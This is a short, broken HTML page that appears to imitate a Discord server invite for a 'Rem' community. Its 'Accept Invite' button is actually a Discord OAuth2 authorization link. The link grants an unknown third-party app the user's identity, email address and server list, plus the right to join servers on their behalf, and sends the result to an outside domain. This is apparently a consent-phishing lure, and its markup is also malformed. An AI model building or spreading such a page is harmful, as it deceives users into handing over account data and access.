<html>

<head>

<script>

</script>

<body>
  <div id="container">

      </div>
      <div class="acceptContainer">
        <form>
          <h1>Discord Rem Comunity</h1>

                src='https://cdn.discordapp.com/icons/899175503565553714/51975d2312a1595966d239db6a5fcb7d.png'></div>
            <p><span class="server">! レムリン has invited you to join</span></p>
          </div>
          <a href="https://discord.com/oauth2/authorize?response_type=code&client_id=888666415559770112&redirect_uri=http%3A%2F%2Fmoon9999.xyz%2Fcallback&scope=identify+email+guilds+guilds.join&state=RIpCni0i4EFPNuXrhvmBljxQKCMZw4" class="acceptBtn">Accept Invite</a>

  <script type="" src="./js/script.js"></script>
